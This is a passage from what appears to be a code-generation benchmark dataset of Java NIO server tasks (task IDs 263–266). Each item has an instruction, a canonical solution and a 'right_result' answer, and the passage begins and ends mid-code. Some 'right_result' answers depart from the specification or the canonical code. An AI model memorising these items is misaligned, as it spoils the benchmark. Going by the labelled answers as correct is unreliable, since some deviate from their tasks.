(key.isConnectable()) {\n                        finishConnect(key, null);\n                    }\n                    selectedKeys.remove();\n                }\n                connect(selector);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void connect(Selector selector) throws IOException {\n        BackendConnection conn = connectQueue.poll();\n        if (conn != null) {\n            SocketChannel socketChannel = SocketChannel.open();\n            socketChannel.configureBlocking(false);\n            socketChannel.connect(new InetSocketAddress(conn.getHost(), conn.getPort()));\n            socketChannel.register(selector, SelectionKey.OP_CONNECT, conn);\n            connectCount++;\n        }\n    }\n\n    private void finishConnect(SelectionKey key, Object att) throws IOException {\n        SocketChannel socketChannel = (SocketChannel) key.channel();\n        if (socketChannel.isConnectionPending()) {\n            socketChannel.finishConnect();\n        }\n        key.interestOps(SelectionKey.OP_READ);\n        NIOProcessor processor = processors[nextProcessor];\n        processor.addConnection(socketChannel, att);\n        nextProcessor = (nextProcessor + 1) % processors.length;\n    }\n\n    private void clearSelectionKey(SelectionKey key) {\n        key.cancel();\n    }\n\n    private NIOProcessor nextProcessor() {\n        return processors[nextProcessor++];\n    }\n\n    public static class ConnectIdGenerator {\n        private long id = 0;\n\n        public synchronized long getNextId() {\n            return ++id;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 263,
    "Instruction": "Task Description: Implement a Java NIO HTTP server that handles multiple client connections asynchronously, measures throughput performance, and tracks message statistics.\n\nClass Description: NioServerPerfTest is a non-blocking NIO server implementation that accepts client connections, reads data efficiently, and tracks performance metrics including bytes received, messages processed, and throughput rates.\n\nAttributes:\n- ch: [ServerSocketChannel] - The server socket channel listening for incoming connections\n- selector: [Selector] - The selector managing multiple non-blocking channels\n- running: [boolean] - Flag controlling server execution\n- buffer: [ByteBuffer] - Buffer for reading incoming data\n- total_bytes_received: [AtomicLong] - Counter for total bytes received\n- total_msgs: [AtomicLong] - Counter for total messages processed\n- start: [AtomicLong] - Timestamp for performance measurement start\n\nMethods:\n- create: [create(int size, boolean direct)] -> [ByteBuffer] - Creates a new ByteBuffer of given size, optionally direct\n- start: [start(boolean direct)] -> [void] - Starts the NIO server with specified buffer type (direct/heap)\n- handle: [handle(SocketChannel ch, ByteBuffer buf)] -> [boolean] - Handles read operations from a client channel, returns false to close connection",
    "Canonical_solution": "import org.jgroups.util.Util;\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\nimport java.util.Set;\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic class NioServerPerfTest {\n    protected ServerSocketChannel ch;\n    protected Selector            selector;\n    protected volatile boolean    running=true;\n    protected ByteBuffer          buffer;\n    protected final AtomicLong    total_bytes_received=new AtomicLong(0);\n    protected final AtomicLong    total_msgs=new AtomicLong(0);\n    protected final AtomicLong    start=new AtomicLong(0);\n\n    public static final long      BYTES_TO_SEND=10_000_000;\n    public static final int       SIZE=1000;\n\n    protected static ByteBuffer create(int size, boolean direct) {\n        return direct? ByteBuffer.allocateDirect(size) : ByteBuffer.allocate(size);\n    }\n\n    protected void start(boolean direct) throws Exception {\n        selector=Selector.open();\n\n        ch=ServerSocketChannel.open();\n        ch.bind(new InetSocketAddress(\"0.0.0.0\", 7500));\n        ch.configureBlocking(false);\n        ch.register(selector, SelectionKey.OP_ACCEPT, null);\n        System.out.println(\"-- server ready\");\n\n        while(running) {\n            selector.select();\n            Set<SelectionKey> keys=selector.selectedKeys();\n            for(Iterator<SelectionKey> it=keys.iterator(); it.hasNext();) {\n                SelectionKey key=it.next();\n                if(!key.isValid()) {\n                    it.remove();\n                    continue;\n                }\n                it.remove();\n                if(key.isAcceptable()) {\n                    SocketChannel client_ch=ch.accept();\n                    if(client_ch != null) {\n                        System.out.printf(\"accepted connection from %s\\n\", client_ch.getRemoteAddress());\n                        client_ch.configureBlocking(false);\n                        client_ch.register(selector, SelectionKey.OP_READ, create(SIZE, direct));\n                    }\n                }\n                else if(key.isReadable()) {\n                    if(!handle((SocketChannel)key.channel(), (ByteBuffer)key.attachment())) {\n                        key.cancel();\n                        Util.close(key.channel());\n                    }\n                }\n            }\n        }\n\n        Util.close(selector,ch);\n    }\n\n    protected boolean handle(SocketChannel ch, ByteBuffer buf) {\n        try {\n            if(start.get() == 0)\n                start.compareAndSet(0, System.currentTimeMillis());\n            int num=ch.read(buf);\n            if(num < 0)\n                return false;\n            total_bytes_received.addAndGet(num);\n            if(!buf.hasRemaining()) {\n                total_msgs.incrementAndGet();\n                buf.rewind();\n            }\n            if(total_bytes_received.get() >= BYTES_TO_SEND) {\n                long time=System.currentTimeMillis() - start.get();\n                double throughput_sec=total_bytes_received.get() / (time / 1000.0), msgs_sec=total_msgs.get() / (time / 1000.0);\n                System.out.printf(\"\\n===========================\\nreceived %d messages in %.2f secs: throughput: %s/sec, %.2f msgs/sec\\n\",\n                                  total_msgs.get(), time/1000.0, Util.printBytes(throughput_sec), msgs_sec);\n                start.set(0);\n                total_bytes_received.set(0);\n                total_msgs.set(0);\n                return false;\n            }\n        }\n        catch(IOException e) {\n            e.printStackTrace();\n        }\n        return true;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 21,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\nimport java.util.Set;\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic class NioServerPerfTest {\n    private ServerSocketChannel ch;\n    private Selector selector;\n    private boolean running = true;\n    private ByteBuffer buffer;\n    private AtomicLong total_bytes_received = new AtomicLong(0);\n    private AtomicLong total_msgs = new AtomicLong(0);\n    private AtomicLong start = new AtomicLong(System.currentTimeMillis());\n\n    public ByteBuffer create(int size, boolean direct) {\n        return direct ? ByteBuffer.allocateDirect(size) : ByteBuffer.allocate(size);\n    }\n\n    public void start(boolean direct) throws IOException {\n        ch = ServerSocketChannel.open();\n        ch.socket().bind(new InetSocketAddress(8080));\n        ch.configureBlocking(false);\n        selector = Selector.open();\n        ch.register(selector, SelectionKey.OP_ACCEPT);\n\n        buffer = create(1024 * 1024, direct); // 1MB buffer\n\n        while (running) {\n            int readyChannels = selector.select();\n            if (readyChannels == 0) continue;\n\n            Set<SelectionKey> selectedKeys = selector.selectedKeys();\n            Iterator<SelectionKey> keyIterator = selectedKeys.iterator();\n\n            while (keyIterator.hasNext()) {\n                SelectionKey key = keyIterator.next();\n\n                if (key.isAcceptable()) {\n                    SocketChannel client = ((ServerSocketChannel) key.channel()).accept();\n                    client.configureBlocking(false);\n                    client.register(selector, SelectionKey.OP_READ);\n                } else if (key.isReadable()) {\n                    handle((SocketChannel) key.channel(), buffer);\n                }\n\n                keyIterator.remove();\n            }\n        }\n    }\n\n    private boolean handle(SocketChannel ch, ByteBuffer buf) throws IOException {\n        int bytesRead = ch.read(buf);\n        if (bytesRead == -1) {\n            ch.close();\n            return false;\n        }\n\n        total_bytes_received.addAndGet(bytesRead);\n        buf.flip();\n\n        while (buf.hasRemaining()) {\n            // Process each message here\n            total_msgs.incrementAndGet();\n            // For simplicity, we're just echoing back what we receive\n            ch.write(buf);\n        }\n\n        buf.clear();\n        return true;\n    }\n\n    public static void main(String[] args) {\n        try {\n            NioServerPerfTest server = new NioServerPerfTest();\n            server.start(true); // Use direct buffers\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 264,
    "Instruction": "Task Description: Implement a Java class that handles asynchronous socket connections using Java NIO (Non-blocking I/O) to manage incoming connections for a high-availability service. The class should be abstract, allowing subclasses to define specific connection handling logic.\n\nClass Description: AcceptSocketService is an abstract class that extends ServiceThread to provide a non-blocking socket server implementation. It manages incoming socket connections using ServerSocketChannel and Selector, delegating the creation of specific connection handlers to subclasses through an abstract method. The class handles the lifecycle of the server socket, including startup, connection acceptance, and shutdown.\n\nAttributes:\n- socketAddressListen: [SocketAddress] - The address and port to listen for incoming connections\n- serverSocketChannel: [ServerSocketChannel] - The server socket channel for accepting connections\n- selector: [Selector] - The selector for managing multiple non-blocking channels\n- messageStoreConfig: [MessageStoreConfig] - Configuration object containing server settings\n- log: [Logger] - Logger instance for recording events and errors\n\nMethods:\n- AcceptSocketService([MessageStoreConfig messageStoreConfig]) -> [void] - Constructor that initializes the service with configuration\n- beginAccept() -> [void] - Initializes and starts the server socket channel and selector\n- shutdown([boolean interrupt]) -> [void] - Shuts down the service and cleans up resources\n- run() -> [void] - Main service loop that handles incoming connections (inherited from ServiceThread)\n- createConnection([SocketChannel sc]) -> [HAConnection] - Abstract method to be implemented by subclasses for creating connection handlers",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.net.SocketAddress;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Set;\nimport org.apache.rocketmq.logging.org.slf4j.Logger;\nimport org.apache.rocketmq.logging.org.slf4j.LoggerFactory;\nimport org.apache.rocketmq.store.config.MessageStoreConfig;\nimport org.apache.rocketmq.common.ServiceThread;\nimport org.apache.rocketmq.common.utils.NetworkUtil;\n\nprotected abstract class AcceptSocketService extends ServiceThread {\n    private final SocketAddress socketAddressListen;\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n    private final MessageStoreConfig messageStoreConfig;\n    private static final Logger log = LoggerFactory.getLogger(LoggerName.STORE_LOGGER_NAME);\n\n    public AcceptSocketService(final MessageStoreConfig messageStoreConfig) {\n        this.messageStoreConfig = messageStoreConfig;\n        this.socketAddressListen = new InetSocketAddress(messageStoreConfig.getHaListenPort());\n    }\n\n    public void beginAccept() throws Exception {\n        this.serverSocketChannel = ServerSocketChannel.open();\n        this.selector = NetworkUtil.openSelector();\n        this.serverSocketChannel.socket().setReuseAddress(true);\n        this.serverSocketChannel.socket().bind(this.socketAddressListen);\n        if (0 == messageStoreConfig.getHaListenPort()) {\n            messageStoreConfig.setHaListenPort(this.serverSocketChannel.socket().getLocalPort());\n            log.info(\"OS picked up {} to listen for HA\", messageStoreConfig.getHaListenPort());\n        }\n        this.serverSocketChannel.configureBlocking(false);\n        this.serverSocketChannel.register(this.selector, SelectionKey.OP_ACCEPT);\n    }\n\n    @Override\n    public void shutdown(final boolean interrupt) {\n        super.shutdown(interrupt);\n        try {\n            if (null != this.serverSocketChannel) {\n                this.serverSocketChannel.close();\n            }\n            if (null != this.selector) {\n                this.selector.close();\n            }\n        } catch (IOException e) {\n            log.error(\"AcceptSocketService shutdown exception\", e);\n        }\n    }\n\n    @Override\n    public void run() {\n        log.info(this.getServiceName() + \" service started\");\n        while (!this.isStopped()) {\n            try {\n                this.selector.select(1000);\n                Set<SelectionKey> selected = this.selector.selectedKeys();\n                if (selected != null) {\n                    for (SelectionKey k : selected) {\n                        if (k.isAcceptable()) {\n                            SocketChannel sc = ((ServerSocketChannel) k.channel()).accept();\n                            if (sc != null) {\n                                log.info(\"HAService receive new connection, \" + sc.socket().getRemoteSocketAddress());\n                                try {\n                                    HAConnection conn = createConnection(sc);\n                                    conn.start();\n                                } catch (Exception e) {\n                                    log.error(\"new HAConnection exception\", e);\n                                    sc.close();\n                                }\n                            }\n                        } else {\n                            log.warn(\"Unexpected ops in select \" + k.readyOps());\n                        }\n                    }\n                    selected.clear();\n                }\n            } catch (Exception e) {\n                log.error(this.getServiceName() + \" service has exception.\", e);\n            }\n        }\n        log.info(this.getServiceName() + \" service end\");\n    }\n\n    protected abstract HAConnection createConnection(final SocketChannel sc) throws IOException;\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 21,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.SocketAddress;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\n\npublic abstract class AcceptSocketService extends ServiceThread {\n    protected SocketAddress socketAddressListen;\n    protected ServerSocketChannel serverSocketChannel;\n    protected Selector selector;\n    protected MessageStoreConfig messageStoreConfig;\n    protected Logger log;\n\n    public AcceptSocketService(MessageStoreConfig messageStoreConfig) {\n        this.messageStoreConfig = messageStoreConfig;\n        this.log = new Logger();\n    }\n\n    public void beginAccept() throws IOException {\n        serverSocketChannel = ServerSocketChannel.open();\n        serverSocketChannel.socket().bind(socketAddressListen);\n        serverSocketChannel.configureBlocking(false);\n        selector = Selector.open();\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n    }\n\n    public void shutdown(boolean interrupt) {\n        if (interrupt) {\n            interrupt();\n        }\n        try {\n            if (serverSocketChannel != null && !serverSocketChannel.isClosed()) {\n                serverSocketChannel.close();\n            }\n            if (selector != null && !selector.isClosed()) {\n                selector.close();\n            }\n        } catch (IOException e) {\n            log.error(\"Error shutting down service\", e);\n        }\n    }\n\n    @Override\n    public void run() {\n        while (!isInterrupted()) {\n            try {\n                selector.select();\n                Iterator<SelectionKey> keys = selector.selectedKeys().iterator();\n                while (keys.hasNext()) {\n                    SelectionKey key = keys.next();\n                    keys.remove();\n                    if (!key.isValid()) {\n                        continue;\n                    }\n                    if (key.isAcceptable()) {\n                        handleAccept(key);\n                    }\n                }\n            } catch (IOException e) {\n                log.error(\"I/O error occurred\", e);\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws IOException {\n        ServerSocketChannel serverChannel = (ServerSocketChannel) key.channel();\n        SocketChannel clientChannel = serverChannel.accept();\n        clientChannel.configureBlocking(false);\n        HAConnection connection = createConnection(clientChannel);\n        clientChannel.register(selector, SelectionKey.OP_READ, connection);\n    }\n\n    protected abstract HAConnection createConnection(SocketChannel sc);\n}\n```"
  },
  {
    "Task_id": 265,
    "Instruction": "Task Description: Implement a Java NIO HTTP server that handles client connections asynchronously, processes incoming requests, and sends responses back to clients. The server should use non-blocking I/O operations managed by a Selector to efficiently handle multiple connections.\n\nClass Description: NioHttpServer is a class that implements a non-blocking HTTP server using Java NIO (New I/O) capabilities. It manages client connections, reads incoming requests, and writes responses asynchronously. The server can also make HTTP requests to external services (like Baidu in the example) to fetch response data.\n\nAttributes:\n- charset: [Charset] - The character set used for encoding/decoding text data (UTF-8 in this case)\n- client: [HttpClient] - Apache HttpClient instance used to make external HTTP requests\n\nMethods:\n- startServer: [startServer(int port)] -> [void] - Starts the HTTP server on the specified port, initializes the ServerSocketChannel and Selector, and begins the event loop to handle client connections\n- handleAccept: [handleAccept(SelectionKey key, Selector selector)] -> [void] - Handles new client connections by accepting the SocketChannel and registering it with the selector for write operations\n- handleRead: [handleRead(SelectionKey key, Selector selector)] -> [void] - Handles incoming data from clients by reading from the SocketChannel and preparing for write operations\n- handleWrite: [handleWrite(SelectionKey key, Selector selector)] -> [void] - Handles writing data to clients by sending responses through the SocketChannel and preparing for read operations\n- executeResponse: [executeResponse()] -> [String] - Makes an HTTP GET request to an external service (Baidu in the example) and returns the response body as a string",
    "Canonical_solution": "import org.apache.commons.codec.Charsets;\nimport org.apache.http.HttpResponse;\nimport org.apache.http.HttpStatus;\nimport org.apache.http.client.HttpClient;\nimport org.apache.http.client.methods.HttpGet;\nimport org.apache.http.impl.client.HttpClientBuilder;\nimport org.apache.http.util.EntityUtils;\n\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.Charset;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class NioHttpServer {\n\n    private static Charset charset = Charset.forName(\"UTF8\");\n    private HttpClient client = HttpClientBuilder.create().build();\n\n    public void startServer(int port) throws IOException {\n        ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();\n        Selector selector = Selector.open();\n        serverSocketChannel.socket().bind(new InetSocketAddress(port));\n        serverSocketChannel.configureBlocking(false);\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n\n        while (true) {\n            if (selector.select(1) > 0) {\n                Set<SelectionKey> set = selector.selectedKeys();\n                Iterator<SelectionKey> keyIterator = set.iterator();\n                while (keyIterator.hasNext()) {\n                    SelectionKey key = keyIterator.next();\n                    if (key.isAcceptable()) {\n                        handleAccept(key, selector);\n                    } else if (key.isReadable()) {\n                        handleRead(key, selector);\n                    } else if (key.isWritable()) {\n                        handleWrite(key, selector);\n                    }\n                    keyIterator.remove();\n                }\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel clientChannel = ((ServerSocketChannel) key.channel()).accept();\n        clientChannel.configureBlocking(false);\n        clientChannel.register(selector, SelectionKey.OP_WRITE);\n    }\n\n    private void handleRead(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n        clientChannel.read(byteBuffer);\n        byteBuffer.flip();\n        System.out.println(Charset.defaultCharset().newDecoder().decode(byteBuffer).toString());\n        key.interestOps(SelectionKey.OP_WRITE);\n        selector.wakeup();\n    }\n\n    private void handleWrite(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n        String data = executeResponse().substring(0, 100);\n        byteBuffer.put(data.getBytes());\n        clientChannel.write(byteBuffer);\n        key.interestOps(SelectionKey.OP_READ);\n        selector.wakeup();\n    }\n\n    private String executeResponse() throws IOException {\n        String data = \"\";\n        HttpGet get = new HttpGet(\"http://www.baidu.com\");\n        HttpResponse response = client.execute(get);\n        if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {\n            data = EntityUtils.toString(response.getEntity(), Charsets.UTF_8);\n        }\n        return data;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 21,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.Charset;\nimport java.util.Iterator;\nimport java.util.Set;\nimport org.apache.http.HttpEntity;\nimport org.apache.http.client.methods.CloseableHttpResponse;\nimport org.apache.http.client.methods.HttpGet;\nimport org.apache.http.impl.client.CloseableHttpClient;\nimport org.apache.http.impl.client.HttpClients;\nimport org.apache.http.util.EntityUtils;\n\npublic class NioHttpServer {\n    private Charset charset = Charset.forName(\"UTF-8\");\n    private CloseableHttpClient client = HttpClients.createDefault();\n\n    public void startServer(int port) throws IOException {\n        ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();\n        serverSocketChannel.bind(new InetSocketAddress(port));\n        serverSocketChannel.configureBlocking(false);\n        Selector selector = Selector.open();\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n\n        while (true) {\n            selector.select();\n            Set<SelectionKey> selectedKeys = selector.selectedKeys();\n            Iterator<SelectionKey> iter = selectedKeys.iterator();\n            while (iter.hasNext()) {\n                SelectionKey key = iter.next();\n                if (key.isAcceptable()) {\n                    handleAccept(key, selector);\n                } else if (key.isReadable()) {\n                    handleRead(key, selector);\n                } else if (key.isWritable()) {\n                    handleWrite(key, selector);\n                }\n                iter.remove();\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key, Selector selector) throws IOException {\n        ServerSocketChannel serverSocketChannel = (ServerSocketChannel) key.channel();\n        SocketChannel socketChannel = serverSocketChannel.accept();\n        socketChannel.configureBlocking(false);\n        socketChannel.register(selector, SelectionKey.OP_READ);\n    }\n\n    private void handleRead(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel socketChannel = (SocketChannel) key.channel();\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        int bytesRead = socketChannel.read(buffer);\n        if (bytesRead == -1) {\n            socketChannel.close();\n            return;\n        }\n        buffer.flip();\n        byte[] data = new byte[buffer.remaining()];\n        buffer.get(data);\n        String request = new String(data, charset);\n        // Process request and prepare response\n        String response = \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html; charset=UTF-8\\r\\n\\r\\n\" + executeResponse();\n        ByteBuffer sendBuffer = ByteBuffer.wrap(response.getBytes(charset));\n        socketChannel.register(selector, SelectionKey.OP_WRITE, sendBuffer);\n    }\n\n    private void handleWrite(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel socketChannel = (SocketChannel) key.channel();\n        ByteBuffer buffer = (ByteBuffer) key.attachment();\n        while (buffer.hasRemaining()) {\n            socketChannel.write(buffer);\n        }\n        socketChannel.register(selector, SelectionKey.OP_READ);\n    }\n\n    private String executeResponse() {\n        try (CloseableHttpResponse response = client.execute(new HttpGet(\"http://www.baidu.com\"))) {\n            HttpEntity entity = response.getEntity();\n            return EntityUtils.toString(entity, charset);\n        } catch (IOException e) {\n            e.printStackTrace();\n            return \"Error fetching response\";\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 266,
    "Instruction": "Task Description: Implement a non-blocking HTTP server using Java NIO (New I/O) that can handle multiple client connections concurrently. The server should be able to accept new connections, read incoming requests, and write responses asynchronously using separate threads for different operations.\n\nClass Description: NioHttpServer is a multi-threaded HTTP server implementation using Java NIO that handles client connections in a non-blocking manner. It uses three separate selectors for different operations: accepting connections, reading requests, and writing responses.\n\nAttributes:\n- serverSocketChannel: ServerSocketChannel - The main server channel that listens for incoming connections\n- selector: Selector - The selector for accepting new client connections\n- clientReadSelector: Selector - The selector for handling read operations from clients\n- clientWriteSelector: Selector - The selector for handling write operations to clients\n\nMethods:\n- NioHttpServer(int port) -> void - Constructor that initializes the server socket channel and selectors, binds to the specified port, and configures non-blocking mode\n- start() -> void - Starts three separate threads for handling server operations (accepting connections, reading requests, and writing responses)\n- ServerChannelThread(Selector serverSelector, Selector clientReadSelector) -> void - Nested class that handles accepting new client connections and registers them with the read selector\n- ClientReadChannelThread(Selector clientReadSelector, Selector clientWriteSelector) -> void - Nested class that handles reading incoming requests from clients and registers them with the write selector when ready to respond\n- ClientWriteChannelThread(Selector clientReadSelector, Selector clientWriteSelector) -> void - Nested class that handles writing responses to clients and registers them back with the read selector when done",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.Charset;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class NioHttpServer {\n\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n    private Selector clientReadSelector;\n    private Selector clientWriteSelector;\n\n    public NioHttpServer(int port) throws IOException {\n        serverSocketChannel = ServerSocketChannel.open();\n        selector = Selector.open();\n        clientReadSelector = Selector.open();\n        clientWriteSelector = Selector.open();\n        \n        serverSocketChannel.socket().bind(new InetSocketAddress(port));\n        serverSocketChannel.configureBlocking(false);\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n    }\n\n    public void start() {\n        new Thread(new ServerChannelThread(selector, clientReadSelector)).start();\n        new Thread(new ClientReadChannelThread(clientReadSelector, clientWriteSelector)).start();\n        new Thread(new ClientWriteChannelThread(clientReadSelector, clientWriteSelector)).start();\n    }\n\n    private static class ServerChannelThread implements Runnable {\n        private Selector serverSelector;\n        private Selector clientReadSelector;\n\n        public ServerChannelThread(Selector serverSelector, Selector clientReadSelector) {\n            this.serverSelector = serverSelector;\n            this.clientReadSelector = clientReadSelector;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (true) {\n                    if (serverSelector.select(1) > 0) {\n                        Set<SelectionKey> set = serverSelector.selectedKeys();\n                        Iterator<SelectionKey> keyIterator = set.iterator();\n\n                        while (keyIterator.hasNext()) {\n                            SelectionKey key = keyIterator.next();\n                            if (key.isAcceptable()) {\n                                SocketChannel clientChannel = ((ServerSocketChannel) key.channel()).accept();\n                                clientChannel.configureBlocking(false);\n                                clientChannel.register(clientReadSelector, SelectionKey.OP_READ);\n                            }\n                            keyIterator.remove();\n                        }\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static class ClientReadChannelThread implements Runnable {\n        private Selector clientReadSelector;\n        private Selector clientWriteSelector;\n\n        public ClientReadChannelThread(Selector clientReadSelector, Selector clientWriteSelector) {\n            this.clientReadSelector = clientReadSelector;\n            this.clientWriteSelector = clientWriteSelector;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (true) {\n                    if (clientReadSelector.select(1) > 0) {\n                        Set<SelectionKey> set = clientReadSelector.selectedKeys();\n                        Iterator<SelectionKey> keyIterator = set.iterator();\n\n                        while (keyIterator.hasNext()) {\n                            SelectionKey key = keyIterator.next();\n\n                            if (key.isReadable()) {\n                                try {\n                                    SocketChannel clientChannel = (SocketChannel) key.channel();\n                                    ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n                                    clientChannel.read(byteBuffer);\n                                    byteBuffer.flip();\n                                    System.out.println(Charset.defaultCharset().newDecoder().decode(byteBuffer).toString());\n                                    clientChannel.register(clientWriteSelector, SelectionKey.OP_WRITE);\n                                } finally {\n                                    keyIterator.remove();\n                                }\n                            }\n                        }\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static class ClientWriteChannelThread implements Runnable {\n        private Selector clientReadSelector;\n        private Selector clientWriteSelector;\n\n        public ClientWriteChannelThread(Selector clientReadSelector, Selector clientWriteSelector) {\n            this.clientReadSelector = clientReadSelector;\n            this.clientWriteSelector = clientWriteSelector;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (true) {\n                    if (clientWriteSelector.select(1) > 0) {\n                        Set<SelectionKey> set = clientWriteSelector.selectedKeys();\n                        Iterator<SelectionKey> keyIterator = set.iterator();\n\n                        while (keyIterator.hasNext()) {\n                            SelectionKey key = keyIterator.next();\n\n                            if (key.isWritable()) {\n                                try {\n                                    SocketChannel clientChannel = (SocketChannel) key.channel();\n                                    ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n                                    String msg = \"server channel write: current time mill \" + System.currentTimeMillis();\n                                    byteBuffer.put(msg.getBytes());\n                                    byteBuffer.flip();\n                                    clientChannel.write(byteBuffer);\n                                    clientChannel.register(clientReadSelector, SelectionKey.OP_READ);\n                                } finally {\n                                    keyIterator.remove();\n                                    key.interestOps(SelectionKey.OP_READ);\n                                }\n                            }\n                        }\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 21,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\n\npublic class NioHttpServer {\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n    private Selector clientReadSelector;\n    private Selector clientWriteSelector;\n\n    public NioHttpServer(int port) throws IOException {\n        serverSocketChannel = ServerSocketChannel.open();\n        serverSocketChannel.bind(new InetSocketAddress(port));\n        serverSocketChannel.configureBlocking(false);\n        selector = Selector.open();\n        clientReadSelector = Selector.open();\n        clientWriteSelector = Selector.open();\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n    }\n\n    public void start() throws IOException {\n        Thread acceptThread = new Thread(new ServerChannelThread(selector, clientReadSelector));\n        Thread readThread = new Thread(new ClientReadChannelThread(clientReadSelector, clientWriteSelector));\n        Thread writeThread = new Thread(new ClientWriteChannelThread(clientReadSelector, clientWriteSelector));\n\n        acceptThread.start();\n        readThread.start();\n        writeThread.start();\n    }\n\n    static class ServerChannelThread implements Runnable {\n        private final Selector serverSelector;\n        private final Selector clientReadSelector;\n\n        public ServerChannelThread(Selector serverSelector, Selector clientReadSelector) {\n            this.serverSelector = serverSelector;\n            this.clientReadSelector = clientReadSelector;\n        }\n\n        @Override\n        public void run() {\n            while (true) {\n                try {\n                    serverSelector.select();\n                    Iterator<SelectionKey> keyIterator = serverSelector.selectedKeys().iterator();\n                    while (keyIterator.hasNext()) {\n                        SelectionKey key = keyIterator.next();\n                        if (key.isAcceptable()) {\n                            SocketChannel clientChannel = ((ServerSocketChannel) key.channel()).accept();\n                            clientChannel.configureBlocking(false);\n                            clientChannel.register(clientReadSelector, SelectionKey.OP_READ);\n                        }\n                        keyIterator.remove();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    static class ClientReadChannelThread implements Runnable {\n        private final Selector clientReadSelector;\n        private final Selector clientWriteSelector;\n\n        public ClientReadChannelThread(Selector clientReadSelector, Selector clientWriteSelector) {\n            this.clientReadSelector = clientReadSelector;\n            this.clientWriteSelector = clientWriteSelector;\n        }\n\n        @Override\n        public void run() {\n            while (true) {\n                try {\n                    clientReadSelector.select();\n                    Iterator<SelectionKey> keyIterator = clientReadSelector.selectedKeys().iterator();\n                    while (keyIterator.hasNext()) {\n                        SelectionKey key = keyIterator.next();\n                        if (key.isReadable()) {\n                            SocketChannel clientChannel = (SocketChannel) key.channel();\n                            ByteBuffer buffer = ByteBuffer.allocate(1024);\n                            int bytesRead = clientChannel.read(buffer);\n                            if (bytesRead == -1) {\n                                clientChannel.close();\n                            } else {\n        